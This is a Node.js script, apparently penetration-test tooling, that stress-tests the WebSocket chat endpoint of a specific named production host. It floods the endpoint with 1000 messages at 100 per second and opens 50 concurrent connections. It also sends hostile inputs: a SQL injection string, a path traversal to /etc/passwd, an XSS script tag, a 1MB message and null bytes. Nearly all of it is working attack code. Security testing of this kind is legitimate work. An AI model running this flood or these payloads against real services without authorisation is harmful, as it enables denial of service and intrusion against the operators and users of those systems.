// WebSocket Spam Test
// Tests WebSocket chat endpoint for rate limiting and DoS vulnerabilities
// Usage: node ws_spam_test.js <TOKEN> <SOLICITATION_ID>

const WebSocket = require('ws');

// Configuration
const BASE_URL = 'wss://api.nexsus.com.br/ws/chat';
const TOKEN = process.argv[2];
const SOLICITATION_ID = process.argv[3] || '1';
const MESSAGE_COUNT = 1000; // Number of messages to send
const DELAY_MS = 10; // Delay between messages (10ms = 100 msg/sec)

if (!TOKEN) {
    console.log('Usage: node ws_spam_test.js <TOKEN> [SOLICITATION_ID]');
    console.log('Example: node ws_spam_test.js eyJhbGc... 123');
    process.exit(1);
}

console.log('========================================');
console.log('WebSocket Spam & Stress Test');
console.log('========================================');
console.log(`Target: ${BASE_URL}`);
console.log(`Messages to send: ${MESSAGE_COUNT}`);
console.log(`Rate: ${1000/DELAY_MS} messages/second`);
console.log('');

// Test 1: Single connection spam
console.log('[Test 1] Single Connection Spam Test');
console.log('--------------------');

function test1_singleConnectionSpam() {
    return new Promise((resolve) => {
        // Connection URL patterns to try
        const urlPatterns = [
            `${BASE_URL}?token=${TOKEN}`,
            `${BASE_URL}?token=${TOKEN}&solicitation_id=${SOLICITATION_ID}`,
            `${BASE_URL}?solicitation_id=${SOLICITATION_ID}`,
        ];

        let sentCount = 0;
        let receivedCount = 0;
        let errorCount = 0;
        const startTime = Date.now();

        // Try first URL pattern
        const wsUrl = urlPatterns[0];
        console.log(`Connecting to: ${wsUrl.substring(0, 60)}...`);

        const ws = new WebSocket(wsUrl, {
            headers: {
                'Authorization': `Bearer ${TOKEN}`
            }
        });

        ws.on('open', () => {
            console.log('✓ Connected successfully');
            console.log('Sending messages...\n');

            let messagesSent = 0;

            const sendInterval = setInterval(() => {
                if (messagesSent >= MESSAGE_COUNT) {
                    clearInterval(sendInterval);
                    
                    // Wait for responses
                    setTimeout(() => {
                        ws.close();
                        
                        const duration = (Date.now() - startTime) / 1000;
                        console.log('\n--------------------');
                        console.log('Test 1 Results:');
                        console.log(`  Messages sent: ${sentCount}`);
                        console.log(`  Messages received: ${receivedCount}`);
                        console.log(`  Errors: ${errorCount}`);
                        console.log(`  Duration: ${duration.toFixed(2)}s`);
                        console.log(`  Rate: ${(sentCount/duration).toFixed(2)} msg/s`);
                        
                        if (errorCount === 0 && sentCount === MESSAGE_COUNT) {
                            console.log('\n🔴 VULNERABILITY: No rate limiting detected!');
                        } else if (errorCount > 0) {
                            console.log('\n✓ Rate limiting or validation detected');
                        }
                        
                        resolve();
                    }, 2000);
                    return;
                }

                try {
                    // Different message formats to test
                    const messages = [
                        JSON.stringify({
                            type: 'message',
                            solicitation_id: SOLICITATION_ID,
                            text: `Test message ${messagesSent}`,
                            timestamp: Date.now()
                        }),
                        JSON.stringify({
                            message: `Spam ${messagesSent}`,
                            solicitation_id: SOLICITATION_ID
                        }),
                        JSON.stringify({
                            content: `Content ${messagesSent}`,
                            chat_id: SOLICITATION_ID
                        })
                    ];

                    const message = messages[messagesSent % messages.length];
                    ws.send(message);
                    sentCount++;
                    messagesSent++;

                    if (messagesSent % 100 === 0) {
                        process.stdout.write(`Sent: ${messagesSent} | Received: ${receivedCount} | Errors: ${errorCount}\r`);
                    }
                } catch (err) {
                    errorCount++;
                    console.error(`Error sending message: ${err.message}`);
                }
            }, DELAY_MS);
        });

        ws.on('message', (data) => {
            receivedCount++;
            try {
                const parsed = JSON.parse(data);
                // Log first few responses
                if (receivedCount <= 3) {
                    console.log(`Received: ${JSON.stringify(parsed).substring(0, 80)}...`);
                }
            } catch (e) {
                // Not JSON
            }
        });

        ws.on('error', (error) => {
            console.error(`\n✗ WebSocket error: ${error.message}`);
            errorCount++;
        });

        ws.on('close', (code, reason) => {
            console.log(`\nConnection closed: ${code} - ${reason}`);
        });
    });
}

// Test 2: Multiple concurrent connections
console.log('\n[Test 2] Multiple Connection Test');
console.log('--------------------');

function test2_multipleConnections() {
    return new Promise((resolve) => {
        const CONNECTION_COUNT = 50;
        console.log(`Opening ${CONNECTION_COUNT} concurrent connections...`);

        let successfulConnections = 0;
        let failedConnections = 0;

        for (let i = 0; i < CONNECTION_COUNT; i++) {
            const ws = new WebSocket(`${BASE_URL}?token=${TOKEN}`, {
                headers: { 'Authorization': `Bearer ${TOKEN}` }
            });

            ws.on('open', () => {
                successfulConnections++;
                
                // Send a test message
                ws.send(JSON.stringify({
                    type: 'message',
                    solicitation_id: SOLICITATION_ID,
                    text: `Connection ${i} test`
                }));

                // Close after short delay
                setTimeout(() => ws.close(), 1000);
            });

            ws.on('error', () => {
                failedConnections++;
            });

            if (i === CONNECTION_COUNT - 1) {
                setTimeout(() => {
                    console.log(`Successful connections: ${successfulConnections}`);
                    console.log(`Failed connections: ${failedConnections}`);
                    
                    if (successfulConnections === CONNECTION_COUNT) {
                        console.log('\n🔴 VULNERABILITY: No connection limit!');
                    } else {
                        console.log('\n✓ Connection limiting detected');
                    }
                    
                    resolve();
                }, 3000);
            }
        }
    });
}

// Test 3: Malformed messages
console.log('\n[Test 3] Malformed Message Test');
console.log('--------------------');

function test3_malformedMessages() {
    return new Promise((resolve) => {
        const ws = new WebSocket(`${BASE_URL}?token=${TOKEN}`, {
            headers: { 'Authorization': `Bearer ${TOKEN}` }
        });

        ws.on('open', () => {
            console.log('Testing malformed messages...');

            const malformedMessages = [
                'not json',
                '{"invalid": json}',
                JSON.stringify({solicitation_id: "' OR '1'='1"}),
                JSON.stringify({solicitation_id: '../../../etc/passwd'}),
                'A'.repeat(1000000), // 1MB message
                JSON.stringify({text: '<script>alert("xss")</script>'}),
                JSON.stringify({solicitation_id: -1}),
                JSON.stringify({solicitation_id: null}),
                '',
                '\x00\x00\x00',
            ];

            let tested = 0;
            const interval = setInterval(() => {
                if (tested >= malformedMessages.length) {
                    clearInterval(interval);
                    setTimeout(() => {
                        ws.close();
                        console.log('\n✓ Malformed message test complete');
                        resolve();
                    }, 1000);
                    return;
                }

                try {
                    ws.send(malformedMessages[tested]);
                    console.log(`  Sent malformed message ${tested + 1}/${malformedMessages.length}`);
                } catch (e) {
                    console.log(`  Error sending: ${e.message}`);
                }
                tested++;
            }, 200);
        });

        ws.on('error', (err) => {
            console.error(`WebSocket error: ${err.message}`);
        });

        ws.on('message', (data) => {
            console.log(`  Response: ${data.toString().substring(0, 60)}...`);
        });
    });
}

// Run all tests
(async () => {
    try {
        await test1_singleConnectionSpam();
        await test2_multipleConnections();
        await test3_malformedMessages();

        console.log('\n========================================');
        console.log('All Tests Complete');
        console.log('========================================');
        console.log('\n⚠️  Vulnerabilities to look for:');
        console.log('  - No rate limiting (can send unlimited messages)');
        console.log('  - No connection limits (can open many connections)');
        console.log('  - Server crashes on malformed input');
        console.log('  - Can send messages to other users\' chats');
        console.log('  - No input validation (XSS, SQLi in messages)');
        console.log('  - Messages visible to unauthorized users');
        
        process.exit(0);
    } catch (error) {
        console.error('Test failed:', error);
        process.exit(1);
    }
})();
